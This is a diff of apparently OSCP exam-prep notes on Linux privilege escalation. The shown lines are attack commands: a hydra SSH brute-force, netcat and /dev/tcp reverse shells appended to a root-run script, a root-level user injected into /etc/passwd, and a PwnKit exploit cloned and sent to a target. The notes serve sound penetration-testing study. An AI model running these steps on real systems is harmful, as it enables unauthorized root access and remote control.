@@ -101,7 +101,7 @@ su - root
 crunch 6 6 -t Lab%%% > wordlist.txt
 
 # SSH brute-force with known username
-hydra -l <user> -P wordlist.txt <target_ip> -t 4 ssh -V
+hydra -l $Username -P wordlist.txt $BoxIP -t 4 ssh -V
 
 # Once on another account, check sudo
 sudo -l
@@ -138,13 +138,13 @@ cat /path/to/script.sh
 
 # Inject mkfifo reverse shell (append -- don't overwrite)
 echo >> /path/to/script.sh
-echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> <PORT> >/tmp/f" >> /path/to/script.sh
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LocalIP $Port >/tmp/f" >> /path/to/script.sh
 
 # Alternative: direct bash reverse shell
-echo 'bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1' >> /path/to/script.sh
+echo 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1' >> /path/to/script.sh
 
 # Listener on Kali
-nc -lnvp <PORT>
+nc -lnvp $Port
 ```
 
 ---
@@ -159,7 +159,7 @@ ls -lah /etc/passwd
 openssl passwd w00t
 
 # Inject a new UID 0 user
-echo 'root2:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
+echo 'root2:$AdminHash:0:0:root:/root:/bin/bash' >> /etc/passwd
 
 # Switch to the injected user
 su root2
@@ -281,11 +281,11 @@ arch              # architecture (e.g. x86_64)
 # Step 2: Search on Kali
 searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"
 searchsploit "linux kernel 4.4"
-searchsploit -x <path/to/exploit.c> | head -30   # inspect source before using
+searchsploit -x $BoxDir | head -30   # inspect source before using
 
 # Step 3: Transfer to target and compile there (avoids glibc mismatch)
 # On Kali:
-scp exploit.c user@<TARGET>:~/
+scp exploit.c user@$BoxIP:~/
 
 # On target:
 gcc exploit.c -o exploit
@@ -294,7 +294,7 @@ gcc exploit.c -o exploit
 # For PwnKit (CVE-2021-4034, pkexec < 0.120, not in searchsploit):
 # On Kali:
 git clone https://github.com/berdav/CVE-2021-4034.git /tmp/pwnkit
-scp -r /tmp/pwnkit user@<TARGET>:/tmp/pwnkit
+scp -r /tmp/pwnkit user@$BoxIP:/tmp/pwnkit
 
 # On target (compile natively to avoid glibc mismatch):
 cd /tmp/pwnkit
@@ -769,3 +769,14 @@ See [[27. Assembling the Pieces|AEN.4]] for the real-world example.
 - [RevShells](https://www.revshells.com/) for shell payload selection
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for technique walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/18. Linux Privilege Escalation]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- demonstrates the workflow described here
